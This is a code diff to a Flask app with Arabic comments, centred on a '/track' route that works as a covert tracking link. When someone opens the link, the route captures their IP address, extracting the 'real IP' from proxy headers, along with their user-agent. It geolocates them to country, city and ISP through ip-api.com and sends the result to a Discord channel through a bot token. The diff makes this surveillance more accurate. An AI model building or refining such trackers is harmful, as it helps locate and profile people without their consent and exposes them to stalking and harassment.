@@ -13,7 +13,6 @@ from threading import Thread
 
 app = Flask('')
 
-# تم وضع رابط استضافتك الحقيقي على Render هنا
 HOST_URL = "https://threesrh-system-data.onrender.com"
 
 @app.route('/')
@@ -61,16 +60,23 @@ def autologin():
 
 @app.route('/track')
 def track_visitor():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    # استخراج الـ IP الحقيقي للزائر بدقة من وسط البروكسي
+    if request.headers.get('X-Forwarded-For'):
+        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    else:
+        ip = request.remote_addr
+        
     user_agent = request.headers.get('User-Agent', 'Unknown')
     
+    country, city, isp = 'Unknown', 'Unknown', 'Unknown'
     try:
-        geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
-        country = geo_res.get('country', 'Unknown')
-        city = geo_res.get('city', 'Unknown')
-        isp = geo_res.get('isp', 'Unknown')
+        geo_res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=3).json()
+        if geo_res.get('status') == 'success':
+            country = geo_res.get('country', 'Unknown')
+            city = geo_res.get('city', 'Unknown')
+            isp = geo_res.get('isp', 'Unknown')
     except Exception:
-        country, city, isp = 'Unknown', 'Unknown', 'Unknown'
+        pass
 
     visit_data = {
         "ip": ip,
@@ -93,7 +99,7 @@ def track_visitor():
     try:
         if CHANNEL_ID and TOKEN:
             payload = {
-                "content": f"🚨 **تم فتح رابط التتبع بنجاح!**\n🌐 الـ IP: `{ip}`\n🌍 الدولة/المدينة: `{country} - {city}`\n🏢 مزود الخدمة: `{isp}`\n💻 المتصفح والنظام: `{user_agent}`"
+                "content": f"🚨 **تم فتح رابط التتبع بنجاح!**\n🌐 الـ IP الحقيقي: `{ip}`\n🌍 الدولة/المدينة: `{country} - {city}`\n🏢 مزود الخدمة: `{isp}`\n💻 المتصفح والنظام: `{user_agent}`"
             }
             requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages", 
                           headers={"Authorization": f"Bot {TOKEN}"}, json=payload, timeout=3)
